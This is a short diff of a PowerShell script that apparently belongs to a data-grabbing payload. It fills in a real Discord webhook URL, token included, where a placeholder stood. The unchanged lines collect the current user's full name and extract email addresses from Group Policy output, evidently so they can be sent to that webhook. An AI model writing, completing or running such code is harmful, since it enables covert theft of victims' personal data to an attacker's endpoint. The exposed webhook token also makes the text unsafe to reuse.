@@ -1,4 +1,4 @@
-$hookurl = "YOUR_WEBHOOK_HERE"
+$hookurl = "https://discord.com/api/webhooks/1178816716931870890/Jm36dZSFFRx7FRyi-Xwd1ZdcRe-HQxvlAVfh7Rutt3eXTTBE_cg2u2KyK3p_DF4Psswe"
 
 $userInfo = Get-WmiObject -Class Win32_UserAccount ;$fullName = $($userInfo.FullName) ;$fullName = ("$fullName").TrimStart("")
 $email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches ;$email = ("$email").Trim()
